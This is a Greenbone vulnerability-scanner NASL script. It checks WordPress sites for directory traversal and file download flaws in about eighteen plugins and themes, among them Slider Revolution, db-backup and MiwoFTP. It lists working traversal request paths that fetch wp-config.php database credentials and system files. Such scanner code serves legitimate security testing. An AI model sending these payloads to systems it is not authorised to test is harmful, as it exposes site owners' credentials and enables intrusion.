# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117055");
  script_version("2020-11-20T10:45:41+0000");
  script_cve_id("CVE-2007-6369", "CVE-2014-9119", "CVE-2014-9734", "CVE-2015-1579", "CVE-2015-9406", "CVE-2015-9470",
                "CVE-2015-1000005", "CVE-2015-1000006", "CVE-2015-1000007");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2020-11-23 10:56:45 +0000 (Mon, 23 Nov 2020)");
  script_tag(name:"creation_date", value:"2020-11-20 08:15:18 +0000 (Fri, 20 Nov 2020)");
  script_name("WordPress Multiple Plugins / Themes Directory Traversal / File Download Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"Multiple WordPress Plugins / Themes are prone to a directory
  traversal or file download vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to
  download arbitrary files.");

  script_tag(name:"affected", value:"The following WordPress Plugins / Themes are known to be affected:

  - Product Input Fields for WooCommerce

  - Slider Revolution (revslider)

  - MiwoFTP

  - aspose-doc-exporter

  - candidate-application-form

  - cloudsafe365-for-wp

  - db-backup

  - google-mp3-audio-player

  - hb-audio-gallery-lite

  - history-collection

  - old-post-spinner

  - pica-photo-gallery

  - pictpress

  - recent-backups

  - wptf-image-gallery

  - mTheme-Unus

  - parallelus-mingle

  - parallelus-salutation");

  script_tag(name:"solution", value:"Please contact the vendor for additional information regarding
  potential updates. If none exist remove the plugin / theme.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

checks = make_array();
checks["/wp-admin/admin-ajax.php?action=revslider_show_image&img="] = "../wp-config.php";
checks["/wp-admin/admin-post.php?alg_wc_pif_download_file="] = "../../../../../wp-config.php";
checks["/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file="] = "..%2F..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/db-backup/download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/google-mp3-audio-player/direct_download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_size=10&file_path="] = "..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/history-collection/download.php?var="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/old-post-spinner/logview.php?ops_file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/pictpress/resize.php?size="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/recent-backups/download-file.php?file_link="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url="] = "../../../../wp-config.php";
checks["/wp-content/themes/mTheme-Unus/css/css.php?files="] = "../../../../wp-config.php";
checks["/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file="] = "../../../../../../wp-config.php";
checks["/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file="] = "../../../../../../wp-config.php";

report = 'The following URLs are vulnerable:\n';

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach vuln_file( keys( checks ) ) {

  wp_config_file = checks[vuln_file];
  url = dir + vuln_file + wp_config_file;

  # nb: We're checking the wp-config.php as well as the traversal_files because wp-config.php might be placed
  # at a different location (e.g. /usr/share/wordpress/wp-config.php) not matching our traversal pattern.
  if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"DB_NAME", extra_check:make_list( "DB_USER", "DB_PASSWORD" ) ) ) {
    report += '\n' + http_report_vuln_url( port:port, url:url, url_only:TRUE );
    VULN = TRUE;
  }

  foreach pattern( keys( files ) ) {

    file = files[pattern];
    if( "..%2F" >< wp_config_file )
      url = dir + vuln_file + crap( length:10*5, data:"..%2F" ) + file;
    else
      url = dir + vuln_file + crap( length:10*3, data:"../" ) + file;

    if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:pattern ) ) {
      report += '\n' + http_report_vuln_url( port:port, url:url, url_only:TRUE );
      VULN = TRUE;
    }
  }
}

files = make_list(
  "/index.php?action=download&option=com_miwoftp&item=wp-config.php",
  "/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes" );

foreach file( files ) {
  url = dir + file;
  if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"DB_NAME", extra_check:make_list( "DB_USER", "DB_PASSWORD" ) ) ) {
    report += '\n' + http_report_vuln_url( port:port, url:url, url_only:TRUE );
    VULN = TRUE;
  }
}

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
